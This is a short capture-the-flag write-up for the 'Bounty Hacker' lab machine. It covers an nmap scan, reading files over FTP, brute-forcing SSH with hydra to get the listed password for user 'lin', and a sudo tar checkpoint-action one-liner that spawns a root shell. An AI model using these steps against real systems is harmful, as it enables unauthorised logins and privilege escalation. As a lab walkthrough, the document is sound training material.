# Bounty Hacker




## Scanning (`sudo nmap -sC -sV -oN nmap/initial 10.10.56.239`)

```
21
22
80
```


## Questions and Answers

* `lin` wrote the task list

* `RedDr4gonSynd1cat3` using hydra to brute-force ssh

* Found user flag in `~/Desktop/user.txt`

* Found root flag in `/root/root.txt` after escalate privileges using the `tar bin`

## Hints

* Running nmap shows ftp open on port 21 and we can read 2 files, `task.txt` and `locks.txt`

* `sudo -l` shows that lin can run `tar` as sudo

* using GTFOBins and searching for `tar`  we see that `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` let us escalate privileges in the machine